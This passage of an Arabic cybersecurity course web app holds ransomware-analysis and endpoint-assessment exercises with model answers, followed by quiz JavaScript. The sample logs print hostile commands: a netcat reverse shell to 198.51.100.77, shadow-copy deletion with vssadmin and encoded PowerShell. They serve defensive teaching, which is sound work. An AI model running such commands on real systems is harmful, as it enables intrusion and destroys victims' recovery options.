: ["موقع الحجز يجب أن يصله العامة ولا يصل هو إلى الداخل. أين توضع خوادم كهذه؟", "تذكّر Implicit deny: اكتب ما تسمح به صراحةً، واختم بمنع الباقي. وتذكّر أن ترتيب القواعد مهم.", "خادم الويب يحتاج قاعدة بياناته. فكّر: هل تضعهما معاً أم تفصل القاعدة إلى الداخل وتفتح لها منفذاً واحداً من خادم الويب فقط؟", "للـ WLAN: شبكتان بـ SSID مختلفين، وكل واحدة على VLAN خاصة."], "ck": ["قسّمت الشبكة إلى أربع مناطق على الأقل، منها DMZ ومنطقة ضيوف معزولة.", "لا توجد قاعدة تسمح بحركة تبدأ من الإنترنت أو من الضيوف نحو الشبكة الداخلية.", "قواعدي مرتبة من الأخص للأعم وتنتهي بمنع صريح أو ضمني.", "الوصول عن بعد والفرع عبر VPN، ولا يوجد RDP مكشوف.", "WLAN الموظفين بـ WPA3 أو WPA2-Enterprise/AES، والضيوف على شبكة منفصلة.", "فعّلت Syslog مركزياً و NTP (أو NetFlow) وعللت اختيارك."], "s": "<p><b>المناطق:<\/b><\/p><div class=\"tw\"><table><tr><th>المنطقة<\/th><th>الشبكة<\/th><th>ما فيها<\/th><\/tr><tr><td>INSIDE-STAFF<\/td><td>10.10.10.0/24<\/td><td>حواسيب الموظفين<\/td><\/tr><tr><td>INSIDE-SERVERS<\/td><td>10.10.20.0/24<\/td><td>خادم الملفات، قاعدة بيانات الحجز، خادم السجلات<\/td><\/tr><tr><td>DMZ<\/td><td>10.10.30.0/24<\/td><td>خادم ويب الحجز<\/td><\/tr><tr><td>GUEST<\/td><td>10.10.40.0/24<\/td><td>Wi-Fi المرضى<\/td><\/tr><tr><td>MGMT<\/td><td>10.10.50.0/24<\/td><td>إدارة أجهزة الشبكة<\/td><\/tr><tr><td>OUTSIDE<\/td><td>الإنترنت<\/td><td><\/td><\/tr><\/table><\/div><p><b>قواعد الفلترة (Stateful، فتُسمح الردود تلقائياً):<\/b><\/p><div class=\"tw\"><table><tr><th>#<\/th><th>من<\/th><th>إلى<\/th><th>الخدمة<\/th><th>القرار<\/th><\/tr><tr><td>1<\/td><td>OUTSIDE<\/td><td>خادم الويب في DMZ<\/td><td>TCP 443<\/td><td>permit<\/td><\/tr><tr><td>2<\/td><td>خادم الويب في DMZ<\/td><td>قاعدة البيانات في SERVERS<\/td><td>منفذ قاعدة البيانات فقط<\/td><td>permit<\/td><\/tr><tr><td>3<\/td><td>DMZ<\/td><td>INSIDE (أي شيء آخر)<\/td><td>any<\/td><td>deny<\/td><\/tr><tr><td>4<\/td><td>INSIDE-STAFF<\/td><td>خادم الملفات<\/td><td>TCP 445<\/td><td>permit<\/td><\/tr><tr><td>5<\/td><td>INSIDE-STAFF<\/td><td>OUTSIDE<\/td><td>80 و 443 و DNS<\/td><td>permit<\/td><\/tr><tr><td>6<\/td><td>GUEST<\/td><td>OUTSIDE<\/td><td>80 و 443 و DNS<\/td><td>permit<\/td><\/tr><tr><td>7<\/td><td>GUEST<\/td><td>كل الشبكات الداخلية و DMZ<\/td><td>any<\/td><td>deny<\/td><\/tr><tr><td>8<\/td><td>VPN users<\/td><td>INSIDE بحسب الدور<\/td><td>الخدمات اللازمة<\/td><td>permit<\/td><\/tr><tr><td>9<\/td><td>OUTSIDE<\/td><td>INSIDE<\/td><td>any<\/td><td>deny<\/td><\/tr><tr><td>10<\/td><td>any<\/td><td>any<\/td><td>any<\/td><td>deny و log<\/td><\/tr><\/table><\/div><p>مثال بصيغة ACL للقاعدتين 1 و 9 على الواجهة الخارجية:<\/p><pre dir=\"ltr\"><code>access-list 110 permit tcp any host 10.10.30.10 eq 443\naccess-list 110 deny ip any any log<\/code><\/pre><p><b>الوصول عن بعد والفرع:<\/b> Remote-access VPN مع MFA للمدير والأطباء. Site-to-site VPN (IPsec) بين الفرع والمقر. لا RDP ولا SMB مكشوفان للإنترنت.<\/p><p><b>الـ WLAN:<\/b><\/p><ul><li><code dir=\"ltr\">Nakheel-Staff<\/code>: WPA3-Enterprise (أو WPA2-Enterprise مع AES) عبر RADIUS، على VLAN الموظفين.<\/li><li><code dir=\"ltr\">Nakheel-Guest<\/code>: شبكة معزولة على VLAN الضيوف مع Client isolation، وكلمة سر تتغير دورياً أو OWE.<\/li><li>تعطيل WPS، تحديث الـ Firmware، تفعيل Management Frame Protection، ومسح دوري لكشف Rogue AP.<\/li><\/ul><p><b>حماية الـ Switch:<\/b> DHCP snooping و Dynamic ARP Inspection، وتعطيل المنافذ غير المستخدمة.<\/p><p><b>الرؤية:<\/b> Syslog مركزي على خادم في SERVERS (السجلات تنجو إن اختُرق جهاز)، و NTP لتوحيد الوقت (شرط لترتيب أحداث التحقيق)، و NetFlow أو Port mirroring إلى IDS إن سمحت الميزانية.<\/p>"}, {"t": "المهمة 5: تحليل ملف مشبوه مستخرج من Packet Capture", "b": "<p><b>الهدف:<\/b> تحليل ملف Malware استُخرج من التقاط شبكة، باستخدام الـ Hash وتقرير Sandbox.<\/p><p>أثناء مراجعة التقاط لحركة حاسوب الاستقبال، وجدت هذا الطلب قبل ساعة من ظهور الفدية:<\/p><pre dir=\"ltr\"><code>GET /files/Invoice_May.pdf.exe HTTP/1.1\nHost: cdn-nakheel-docs.example\nUser-Agent: Mozilla/5.0\n---\nHTTP/1.1 200 OK\nContent-Type: application/octet-stream\nContent-Length: 412672<\/code><\/pre><p>استخرجت الملف من الالتقاط وحسبت بصمته:<\/p><pre dir=\"ltr\"><code>SHA256: 9f2c1e7ab4d05c63e81f0a927d4b6c35e0a1f8d27c94b3e65a08d1f47b2c9e10<\/code><\/pre><p>بحثت بالـ Hash في خدمة فحص عامة: 3 محركات من 70 صنفته خبيثاً. ثم شغّله زميل أقدم في Sandbox معزول، وهذا ملخص التقرير:<\/p><pre dir=\"ltr\"><code>Process tree:\n  Invoice_May.pdf.exe (PID 2204)\n    └─ cmd.exe /c vssadmin delete shadows /all /quiet\n    └─ powershell.exe -enc &lt;base64&gt;\nFiles:\n  Created  C:\\Users\\Public\\svch0st.exe\n  Modified 1,842 files -&gt; renamed to *.lckd\n  Created  READ_ME_NOW.txt (in 212 folders)\nRegistry:\n  Set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = C:\\Users\\Public\\svch0st.exe\nNetwork:\n  DNS  query  xk2q9v7m1tz.example\n  TCP  203.0.113.50:4444  (established)<\/code><\/pre><p><b>المطلوب:<\/b><\/p><ul><li>ما حكمك على الملف، ومن أي عائلة Malware هو؟<\/li><li>اشرح دلالة أربعة سلوكيات على الأقل من التقرير.<\/li><li>استخرج قائمة IOCs مصنفة (ملفات، Registry، شبكة).<\/li><li>لماذا صنّفه 3 محركات فقط من 70؟ وهل يغيّر ذلك حكمك؟<\/li><li>ما إجراءات الاحتواء والبحث في باقي الأجهزة؟<\/li><\/ul>", "h": ["دقق في اسم الملف المُنزَّل: ما امتداده الحقيقي؟ ولماذا سُمّي هكذا؟", "الأمر <code dir=\"ltr\">vssadmin delete shadows<\/code> يحذف نسخ الظل التي يستخدمها Windows لاسترجاع الملفات. لماذا يفعل برنامج ذلك؟", "قارن <code dir=\"ltr\">svch0st.exe<\/code> بالاسم الشرعي ومساره الطبيعي (وحدة 7).", "كل IOC تستخرجه يُستعمل مرتين: للحظر، وللبحث عنه في الأجهزة الأخرى."], "ck": ["حكمت بأنه Ransomware وعللت ذلك من السلوك.", "شرحت أربعة سلوكيات على الأقل: الامتداد المزدوج، حذف نسخ الظل، مفتاح Run، انتحال اسم svchost، التشفير الجماعي، اتصال C2.", "استخرجت IOCs من الأنواع الثلاثة: ملفات و Registry وشبكة.", "فسّرت قلة الكشف (عينة جديدة أو معدَّلة) ولم أعتبرها دليل براءة.", "اقترحت احتواءً (عزل وحظر) وبحثاً بالـ IOCs في بقية الأجهزة."], "s": "<p><b>الحكم:<\/b> خبيث بيقين. هو <b>Ransomware<\/b> وصل كـ Trojan (ملف يتنكر في هيئة فاتورة).<\/p><p><b>دلالة السلوكيات:<\/b><\/p><ul><li><b>الامتداد المزدوج<\/b> <code dir=\"ltr\">Invoice_May.pdf.exe<\/code>: ملف تنفيذي يتنكر في هيئة PDF، اعتماداً على أن Windows يخفي الامتداد الأخير افتراضياً. خداع للمستخدم (Social Engineering).<\/li><li><b><code dir=\"ltr\">vssadmin delete shadows<\/code><\/b>: حذف نسخ الظل لمنع الضحية من استرجاع الملفات دون دفع. بصمة شبه حصرية لبرامج الفدية.<\/li><li><b><code dir=\"ltr\">powershell.exe -enc<\/code><\/b>: أمر PowerShell مرمَّز لإخفاء محتواه. أسلوب Living off the Land.<\/li><li><b>تعديل 1,842 ملفاً وإعادة تسميتها<\/b> إلى <code dir=\"ltr\">*.lckd<\/code> مع رسالة <code dir=\"ltr\">READ_ME_NOW.txt<\/code> في كل مجلد: تشفير جماعي ورسالة فدية.<\/li><li><b><code dir=\"ltr\">C:\\Users\\Public\\svch0st.exe<\/code><\/b>: انتحال اسم <code dir=\"ltr\">svchost.exe<\/code> (بصفر بدل الحرف o) ومن مسار غير System32.<\/li><li><b>مفتاح Run<\/b> في HKCU: آلية Persistence ليعمل بعد كل دخول.<\/li><li><b>استعلام عن نطاق عشوائي الشكل<\/b> ثم اتصال بمنفذ 4444: اتصال بخادم C2، وربما تهريب بيانات قبل التشفير (Double extortion).<\/li><\/ul><p><b>قائمة IOCs:<\/b><\/p><div class=\"tw\"><table><tr><th>النوع<\/th><th>المؤشر<\/th><\/tr><tr><td>File hash<\/td><td>SHA256 <code dir=\"ltr\">9f2c1e7a…9e10<\/code><\/td><\/tr><tr><td>File name / path<\/td><td><code dir=\"ltr\">Invoice_May.pdf.exe<\/code> ، <code dir=\"ltr\">C:\\Users\\Public\\svch0st.exe<\/code> ، <code dir=\"ltr\">READ_ME_NOW.txt<\/code> ، الامتداد <code dir=\"ltr\">.lckd<\/code><\/td><\/tr><tr><td>Registry<\/td><td><code dir=\"ltr\">HKCU\\...\\CurrentVersion\\Run\\Updater<\/code><\/td><\/tr><tr><td>Domain<\/td><td><code dir=\"ltr\">cdn-nakheel-docs.example<\/code> (مصدر التنزيل) ، <code dir=\"ltr\">xk2q9v7m1tz.example<\/code> (C2)<\/td><\/tr><tr><td>IP : Port<\/td><td><code dir=\"ltr\">203.0.113.50:4444<\/code><\/td><\/tr><tr><td>Behavior (IOA)<\/td><td>Process يستدعي vssadmin لحذف نسخ الظل، و PowerShell بأمر مرمَّز<\/td><\/tr><\/table><\/div><p><b>لماذا 3 من 70 فقط؟<\/b> العينة جديدة أو أُعيد تحزيمها لتغيير بصمتها، والكشف بالتواقيع يتأخر عن الجديد. لا يغيّر ذلك الحكم: السلوك في الـ Sandbox دليل أقوى من غياب التوقيع. ولاحظ أن نطاق التنزيل يحاكي اسم العيادة، فالهجوم موجَّه.<\/p><p><b>الاحتواء والبحث:<\/b><\/p><ul><li>عزل حاسوب الاستقبال وأي جهاز تظهر عليه المؤشرات عن الشبكة، دون إطفائه إن أمكن حفظاً لأدلة الذاكرة.<\/li><li>حظر النطاقين والعنوان على الـ Firewall و DNS.<\/li><li>البحث في كل الأجهزة عن: الملف <code dir=\"ltr\">svch0st.exe<\/code>، مفتاح <code dir=\"ltr\">Updater<\/code>، ملفات <code dir=\"ltr\">.lckd<\/code>، واتصالات بالعنوان (من سجلات الـ Firewall أو NetFlow).<\/li><li>تعطيل الحسابات التي استُخدمت على الجهاز المصاب وتغيير كلمات سرها.<\/li><li>إعادة بناء الأجهزة المصابة من مصدر نظيف والاسترجاع من نسخة احتياطية سليمة سابقة للإصابة.<\/li><li>توثيق الخط الزمني، ومشاركة الـ IOCs.<\/li><\/ul><p><b>ملاحظة ربط:<\/b> في المهمة 2 ظهر مدخل عبر RDP، وهنا مدخل عبر ملف مُنزَّل. وجود مدخلين محتملين يوجب التحقق من الخط الزمني لكل منهما، ولا يُفترض أن أحدهما وحده السبب.<\/p>"}, {"t": "المهمة 6: تقييم أمن الـ Endpoints على Windows و Linux", "b": "<p><b>الهدف:<\/b> تقييم جهازين من مخرجات أوامر حقيقية الشكل.<\/p><p><b>(أ) حاسوب محاسب (Windows 11):<\/b><\/p><pre dir=\"ltr\"><code>C:\\&gt; net localgroup administrators\nAdministrator\naccountant1\nsupport_tmp\nC:\\&gt; netstat -abno\n  TCP  0.0.0.0:3389      0.0.0.0:0          LISTENING     1104  [svchost.exe]\n  TCP  0.0.0.0:445       0.0.0.0:0          LISTENING     4\n  TCP  10.10.10.23:50211 203.0.113.50:4444  ESTABLISHED   7788  [svch0st.exe]\nC:\\&gt; manage-bde -status C:\n  Conversion Status:  Fully Decrypted\n  Protection Status:  Protection Off\nC:\\&gt; Get-MpComputerStatus | select RealTimeProtectionEnabled\n  RealTimeProtectionEnabled : False<\/code><\/pre><p><b>(ب) خادم الحجز (Ubuntu):<\/b><\/p><pre dir=\"ltr\"><code>$ sudo ss -tulnp\ntcp LISTEN 0.0.0.0:22    sshd\ntcp LISTEN 0.0.0.0:23    telnetd\ntcp LISTEN 0.0.0.0:80    nginx\ntcp LISTEN 0.0.0.0:443   nginx\ntcp LISTEN 0.0.0.0:3306  mysqld\n$ grep -E &quot;PermitRootLogin|PasswordAuthentication&quot; /etc/ssh/sshd_config\nPermitRootLogin yes\nPasswordAuthentication yes\n$ ls -l /etc/shadow /var/www/booking/config.php\n-rw-r--r-- 1 root root     1532 May  1 09:12 /etc/shadow\n-rwxrwxrwx 1 www-data www-data 412 Apr 28 14:03 /var/www/booking/config.php\n$ apt list --upgradable 2&gt;/dev/null | wc -l\n147\n$ ps -ef | grep -v grep | grep www-data\nwww-data  911    1  0 May01 ?  00:02:11 nginx: worker process\nwww-data 4410  911  0 02:13 ?  00:00:00 /bin/sh -c nc 198.51.100.77 9001 -e /bin/bash<\/code><\/pre><p><b>المطلوب:<\/b> لكل جهاز، اكتب قائمة الملاحظات (ما المشكلة ولماذا هي مشكلة)، وصنّف كل ملاحظة: <b>دليل اختراق<\/b> أم <b>ضعف إعداد<\/b>. ثم اكتب الإصلاح.<\/p>", "h": ["في Windows: قارن العنوان والمنفذ في netstat بما وجدته في المهمة 5.", "في Linux: حوّل صلاحيات الملفين إلى أرقام. من يستطيع قراءة /etc/shadow؟ ومن يستطيع تعديل config.php؟", "انظر إلى الـ Parent في آخر سطر من ps: من هو الأب 911؟ وهل يُفترض أن يلد خادم الويب Shell؟", "المنفذ 3306 هو MySQL. هل يجب أن يستمع على كل الواجهات <code dir=\"ltr\">0.0.0.0<\/code>؟"], "ck": ["ميّزت بين أدلة الاختراق وضعف الإعداد في الجهازين.", "في Windows: رصدت اتصال C2، الحساب support_tmp، تعطل الحماية اللحظية، غياب BitLocker، و RDP المستمع.", "في Linux: رصدت الـ Reverse shell من خادم الويب، Telnet، دخول root بكلمة سر، صلاحيات shadow و config.php، MySQL المكشوف، والتحديثات المتأخرة.", "ربطت عنوان 198.51.100.77 بهجوم SQL injection في المهمة 2.", "اقترحت إصلاحاً محدداً لكل ملاحظة، وقدّمت العزل وإعادة البناء للأجهزة المخترقة."], "s": "<p><b>(أ) Windows:<\/b><\/p><div class=\"tw\"><table><tr><th>الملاحظة<\/th><th>التصنيف<\/th><th>لماذا<\/th><th>الإصلاح<\/th><\/tr><tr><td>اتصال قائم بـ <code dir=\"ltr\">203.0.113.50:4444<\/code> من <code dir=\"ltr\">svch0st.exe<\/code><\/td><td>دليل اختراق<\/td><td>يطابق IOCs المهمة 5: الجهاز مصاب ويتصل بـ C2<\/td><td>عزل فوري، ثم إعادة بناء<\/td><\/tr><tr><td>الحماية اللحظية معطلة<\/td><td>دليل اختراق مرجَّح<\/td><td>الـ Malware يعطلها ليعمل بحرية<\/td><td>بعد إعادة البناء: تفعيلها مع Tamper Protection<\/td><\/tr><tr><td>الحساب <code dir=\"ltr\">support_tmp<\/code> في المديرين<\/td><td>مشبوه، يُعامل كدليل حتى يثبت العكس<\/td><td>حساب غير معروف بأعلى صلاحية، وقد يكون Backdoor<\/td><td>التحقق من تاريخ إنشائه (Event 4720 و 4732) ثم حذفه<\/td><\/tr><tr><td><code dir=\"ltr\">accountant1<\/code> مدير محلي<\/td><td>ضعف إعداد<\/td><td>أي Malware يشغّله يرث صلاحيات كاملة<\/td><td>تحويله إلى Standard user<\/td><\/tr><tr><td>القرص غير مشفر<\/td><td>ضعف إعداد<\/td><td>بيانات مالية مكشوفة إن سُرق الجهاز<\/td><td>BitLocker مع TPM<\/td><\/tr><tr><td>RDP يستمع على 3389<\/td><td>ضعف إعداد<\/td><td>مدخل للحركة الأفقية والتخمين<\/td><td>تعطيله إن لم يلزم، أو حصره بالـ Firewall على شبكة الإدارة<\/td><\/tr><tr><td>SMB على 445<\/td><td>طبيعي في شبكة Windows<\/td><td><\/td><td>حصره بالـ Firewall على الشبكة الداخلية وتعطيل SMBv1<\/td><\/tr><\/table><\/div><p><b>(ب) Linux:<\/b><\/p><div class=\"tw\"><table><tr><th>الملاحظة<\/th><th>التصنيف<\/th><th>لماذا<\/th><th>الإصلاح<\/th><\/tr><tr><td><code dir=\"ltr\">nginx<\/code> (PID 911) هو الأب لـ <code dir=\"ltr\">/bin/sh -c nc 198.51.100.77 9001 -e /bin/bash<\/code><\/td><td>دليل اختراق<\/td><td>خادم الويب لا يلد Shell؛ هذا Reverse shell إلى عنوان المهاجم نفسه صاحب SQL injection في المهمة 2. تنفيذ أوامر عن بعد عبر تطبيق الحجز<\/td><td>عزل الخادم، حفظ الأدلة، إعادة بناء من مصدر نظيف، إصلاح التطبيق<\/td><\/tr><tr><td><code dir=\"ltr\">config.php<\/code> بصلاحيات 777<\/td><td>ضعف إعداد خطير (وربما استُغل)<\/td><td>الكل يقرأ ويعدّل ملفاً فيه غالباً كلمة سر قاعدة البيانات<\/td><td><code dir=\"ltr\">chmod 640<\/code> ومالك مناسب، وتغيير كلمة سر القاعدة<\/td><\/tr><tr><td><code dir=\"ltr\">/etc/shadow<\/code> بصلاحيات 644<\/td><td>ضعف إعداد خطير<\/td><td>الكل يقرأ Hashes كلمات السر فيمكن كسرها Offline<\/td><td><code dir=\"ltr\">chmod 640<\/code> والمالك root:shadow، وتغيير كل كلمات السر<\/td><\/tr><tr><td>Telnet على 23<\/td><td>ضعف إعداد<\/td><td>بروتوكول غير مشفر يكشف كلمات السر<\/td><td>إيقافه وإزالته<\/td><\/tr><tr><td><code dir=\"ltr\">PermitRootLogin yes<\/code> و <code dir=\"ltr\">PasswordAuthentication yes<\/code><\/td><td>ضعف إعداد<\/td><td>يسمح بتخمين كلمة سر root عن بعد<\/td><td>القيمتان <code dir=\"ltr\">no<\/code>، ومفاتيح SSH، وحصر 22 على شبكة الإدارة أو VPN<\/td><\/tr><tr><td>MySQL على <code dir=\"ltr\">0.0.0.0:3306<\/code><\/td><td>ضعف إعداد<\/td><td>قاعدة البيانات مكشوفة للشبكة كلها<\/td><td>ربطها بـ <code dir=\"ltr\">127.0.0.1<\/code> أو بعنوان داخلي وفلترتها<\/td><\/tr><tr><td>147 حزمة تنتظر التحديث<\/td><td>ضعف إعداد<\/td><td>ثغرات معروفة غير مرقّعة<\/td><td><code dir=\"ltr\">apt update<\/code> ثم <code dir=\"ltr\">apt upgrade<\/code> وتفعيل التحديث الأمني التلقائي<\/td><\/tr><tr><td>HTTP على 80<\/td><td>مقبول إن كان يحوّل إلى 443 فقط<\/td><td><\/td><td>التأكد من التحويل الإجباري إلى HTTPS<\/td><\/tr><\/table><\/div><p><b>الخلاصة:<\/b> الجهازان <b>مخترقان<\/b> وليسا «ضعيفين فقط». المخترَق لا يُنظَّف في مكانه: يُعزل، تُحفظ أدلته، يُعاد بناؤه، وتُغيَّر كل بيانات الدخول التي مرّت به. والخط الزمني يتضح: SQL injection على الحجز عند 02:11، ثم Shell عند 02:13 من العنوان نفسه.<\/p>"}, {"t": "المهمة 7: التقرير التنفيذي والسياسات", "b": "<p><b>الهدف:<\/b> أن تحوّل عملك الفني إلى وثيقة تفهمها الإدارة وتتصرف بناءً عليها، وأن تثبت فهمك للسياسات والتوعية.<\/p><p><b>المطلوب، في صفحة واحدة:<\/b><\/p><ul><li><b>ملخص تنفيذي<\/b> من خمسة أسطر على الأكثر بلغة غير تقنية: ماذا حدث، ما الأثر، وما المطلوب من الإدارة.<\/li><li><b>الخط الزمني<\/b> للحادث كما استنتجته من المهام 2 و5 و6.<\/li><li><b>أهم خمس توصيات<\/b> مرتبة، ولكل منها المسؤول والمدة.<\/li><li><b>ثلاث وثائق<\/b> تقترح كتابتها: سمِّ كل واحدة وحدد مستواها (Policy، Standard، Procedure) واكتب سطراً من محتواها.<\/li><li><b>خطة توعية<\/b> من ثلاثة عناصر.<\/li><li><b>كيف نقيس التحسن<\/b> بعد ثلاثة أشهر (مؤشران قابلان للقياس).<\/li><\/ul>", "h": ["المدير لا يعرف ما هو SQL injection. قل «ثغرة في موقع الحجز سمحت بقراءة بيانات المرضى».", "ابدأ الملخص بأهم معلومة: هل تسربت بيانات مرضى؟ هل العمل متوقف؟", "للقياس، اختر أرقاماً يمكن عدّها: نسبة الأجهزة المشفرة، نسبة النقر في محاكاة التصيد، عدد الأجهزة المتأخرة في التحديث."], "ck": ["ملخصي خالٍ من المصطلحات غير المشروحة ويبدأ بالأثر على العمل والمرضى.", "الخط الزمني مرتب ويستند إلى أدلة من المهام السابقة.", "كل توصية لها مسؤول ومدة.", "اقترحت وثائق من مستويات مختلفة وميّزت بين Policy و Standard و Procedure.", "خطة التوعية مستمرة وليست محاضرة واحدة، وتشجع التبليغ دون لوم.", "حددت مؤشرين قابلين للقياس."], "s": "<p><b>ملخص تنفيذي<\/b><\/p><p>تعرضت العيادة هذا الأسبوع لهجومين إلكترونيين مترابطين. قرأ مهاجمون بيانات من موقع حجز المواعيد وسيطروا على خادمه، وشُفّرت ملفات على خادم الملفات مع طلب فدية. يُحتمل بقوة تسرب بيانات مرضى، وقد يترتب على ذلك التزام قانوني بالتبليغ. أوقفنا مداخل الهجوم المعروفة، ونحتاج موافقتكم على إعادة بناء ثلاثة أجهزة، وعلى خطة تأمين مدتها ثلاثة أشهر بكلفة محدودة. لا نوصي بدفع الفدية.<\/p><p><b>الخط الزمني<\/b><\/p><div class=\"tw\"><table><tr><th>الوقت<\/th><th>الحدث<\/th><th>الدليل<\/th><\/tr><tr><td>قبل الحادث<\/td><td>منفذ التحكم عن بعد مكشوف للإنترنت، وموقع الحجز فيه ثغرة<\/td><td>إعداد الـ Router، مهمة 2<\/td><\/tr><tr><td>02:11<\/td><td>SQL injection على موقع الحجز من 198.51.100.77<\/td><td>سجل الويب<\/td><\/tr><tr><td>02:13<\/td><td>Reverse shell من خادم الحجز إلى العنوان نفسه<\/td><td>ps، مهمة 6<\/td><\/tr><tr><td>الليلة نفسها<\/td><td>Brute force على RDP ثم دخول ناجح بحساب Administrator<\/td><td>Event 4625 ثم 4624<\/td><\/tr><tr><td>قبل الصباح بساعة<\/td><td>تنزيل <code dir=\"ltr\">Invoice_May.pdf.exe<\/code> على حاسوب الاستقبال وتشغيله<\/td><td>الالتقاط، مهمة 5<\/td><\/tr><tr><td>الصباح<\/td><td>تشفير المشاركات ورسائل الفدية، واتصال C2 من حاسوب المحاسب<\/td><td>مهام 2 و5 و6<\/td><\/tr><\/table><\/div><p><b>أهم خمس توصيات<\/b><\/p><div class=\"tw\"><table><tr><th>#<\/th><th>التوصية<\/th><th>المسؤول<\/th><th>المدة<\/th><\/tr><tr><td>1<\/td><td>عزل الأجهزة الثلاثة المخترقة وإعادة بنائها، وتغيير كل كلمات السر<\/td><td>مسؤول IT<\/td><td>48 ساعة<\/td><\/tr><tr><td>2<\/td><td>إغلاق كل وصول مباشر من الإنترنت، و VPN مع MFA<\/td><td>مسؤول IT<\/td><td>أسبوع<\/td><\/tr><tr><td>3<\/td><td>نسخ احتياطي 3-2-1 مع اختبار استرجاع<\/td><td>مسؤول IT<\/td><td>أسبوع<\/td><\/tr><tr><td>4<\/td><td>تقسيم الشبكة وفصل الضيوف (تصميم المهمة 4) وإصلاح موقع الحجز<\/td><td>مسؤول IT والمطوّر<\/td><td>شهر<\/td><\/tr><tr><td>5<\/td><td>حسابات Standard، تشفير الأجهزة، وتحديثات مفروضة<\/td><td>مسؤول IT<\/td><td>شهر<\/td><\/tr><\/table><\/div><p><b>وثائق مقترحة<\/b><\/p><div class=\"tw\"><table><tr><th>الوثيقة<\/th><th>المستوى<\/th><th>سطر منها<\/th><\/tr><tr><td>سياسة الاستخدام المقبول وحماية بيانات المرضى<\/td><td>Policy<\/td><td>«بيانات المرضى لا تُخزَّن ولا تُنقل إلا على أنظمة العيادة المعتمدة والمشفرة»<\/td><\/tr><tr><td>معيار كلمات السر والوصول<\/td><td>Standard<\/td><td>«14 حرفاً على الأقل، قفل بعد 5 محاولات، و MFA لكل وصول عن بعد»<\/td><\/tr><tr><td>إجراء الاستجابة لإصابة بـ Ransomware<\/td><td>Procedure<\/td><td>«1. افصل الجهاز عن الشبكة ولا تطفئه. 2. اتصل بمسؤول IT على الرقم كذا. 3. …»<\/td><\/tr><\/table><\/div><p><b>خطة التوعية<\/b><\/p><ul><li>جلسة قصيرة لكل الموظفين خلال أسبوعين، مثالها هذا الحادث نفسه.<\/li><li>محاكاة تصيد شهرية مع تدريب فوري لمن ينقر، دون عقاب.<\/li><li>قناة تبليغ واحدة سهلة (رقم وبريد)، وشكر علني لمن يبلّغ. وقاعدة ثابتة: أي طلب مالي أو طلب بيانات يُتحقق منه هاتفياً.<\/li><\/ul><p><b>مؤشرات القياس بعد ثلاثة أشهر<\/b><\/p><ul><li>نسبة الأجهزة المشفرة والمحدَّثة: الهدف 100%.<\/li><li>نسبة النقر في محاكاة التصيد: تنخفض إلى أقل من النصف، وترتفع نسبة التبليغ.<\/li><li>عدد المنافذ المكشوفة للإنترنت: 443 فقط.<\/li><li>نجاح اختبار استرجاع شهري موثَّق.<\/li><\/ul><p><b>كلمة أخيرة:<\/b> إن وصلت إلى هنا وكتبت محاولاتك قبل قراءة الحلول، فقد مارست عمل المحلل كاملاً: صنّفت البيانات، قرأت الأدلة، قيّمت الخطر، صممت الدفاع، حللت العينة، فحصت الأجهزة، وخاطبت الإدارة. انتقل الآن إلى صفحة التقييم النهائي.<\/p>"}]}};
const KEY='esec-course-ar-v1';
let S={q:{},ex:{},pj:{},theme:''};
try{const r=localStorage.getItem(KEY);if(r)S=Object.assign(S,JSON.parse(r));}catch(e){}
const save=()=>{try{localStorage.setItem(KEY,JSON.stringify(S));}catch(e){}};
const $=s=>document.querySelector(s);
const el=(t,c,h)=>{const e=document.createElement(t);if(c)e.className=c;if(h!=null)e.innerHTML=h;return e;};
const shuffle=a=>{a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;};

/* ---------- pages ---------- */
const P=[{id:'home',type:'home',t:'ابدأ من هنا'}];
D.mods.forEach((m,mi)=>m.secs.forEach((s,si)=>P.push({id:'m'+mi+'s'+si,type:s.kind,m,mi,s,si,t:s.t})));
P.push({id:'project',type:'project',t:D.proj.t},{id:'eval',type:'eval',t:'التقييم النهائي'});
const qids=p=>p.type!=='lesson'?[]:p.s.cs.map((c,i)=>p.id+'c'+i).concat(p.s.test.map((q,i)=>p.id+'t'+i));
const taskDone=i=>{const t=S.pj[i],n=D.proj.tasks[i].ck.length;return !!(t&&t.sol&&t.ck&&t.ck.filter(Boolean).length===n);};
function pageDone(p){
 if(p.type==='lesson')return qids(p).every(id=>S.q[id]);
 if(p.type==='exam')return S.ex[p.id]>=70;
 if(p.type==='project')return D.proj.tasks.every((t,i)=>taskDone(i));
 return false;
}
function totals(){
 let tot=0,done=0;
 P.forEach(p=>{
  if(p.type==='lesson'){const q=qids(p);tot+=q.length;done+=q.filter(id=>S.q[id]).length;}
  else if(p.type==='exam'){tot+=3;if(S.ex[p.id]>=70)done+=3;}
  else if(p.type==='project'){D.proj.tasks.forEach((t,i)=>{tot+=3;if(taskDone(i))done+=3;});}
 });
 return {tot,done};
}

/* ---------- questions ---------- */
const KL={mc:'اختيار من متعدد',tf:'صح أم خطأ',sa:'إجابة قصيرة'};
function renderQ(q,qid,cb){
 const box=el('div','quiz');
 box.append(el('div','qk',KL[q.k]),el('div','qq',q.q));
 const area=el('div','qa'),fb=el('div','fb');box.append(area,fb);
 function finish(ok,extra,silent){
  fb.className='fb '+(ok?'ok':'no');
  fb.innerHTML='<div class="hd">'+(ok?'✓ إجابة صحيحة':'✗ إجابة غير صحيحة')+'</div>'+(extra||'')+'<div>'+q.e+'</div>';
  if(qid){
   if(!silent){const pv=S.q[qid];S.q[qid]={ok:ok,f:pv?pv.f:ok};save();}
   const rb=el('button','btn sec sm','أعد المحاولة');rb.onclick=()=>draw(false);fb.append(rb);
  }
  if(!silent&&cb)cb(ok);
 }
 function draw(restore){
  area.innerHTML='';fb.className='fb';fb.innerHTML='';
  const prev=restore&&qid?S.q[qid]:null;
  if(q.k==='sa'){
   const ta=el('textarea');ta.placeholder='اكتب إجابتك بكلماتك (استخدم المصطلحات الإنجليزية)…';
   const b=el('button','btn','تحقق من إجابتي');b.style.alignSelf='flex-start';
   area.append(ta,b);
   b.onclick=()=>{
    const v=ta.value.trim().toLowerCase();
    if(v.length<3){ta.focus();return;}
    const miss=q.kw.filter(g=>!g.some(k=>v.includes(k)));
    ta.disabled=true;b.disabled=true;
    finish(miss.length===0,(miss.length?'<div>لم أجد في إجابتك هذه الأفكار الأساسية: <b dir="ltr">'+miss.map(g=>g[0]).join(' ، ')+'</b></div>':'')+'<div><b>الإجابة النموذجية:</b></div>');
   };
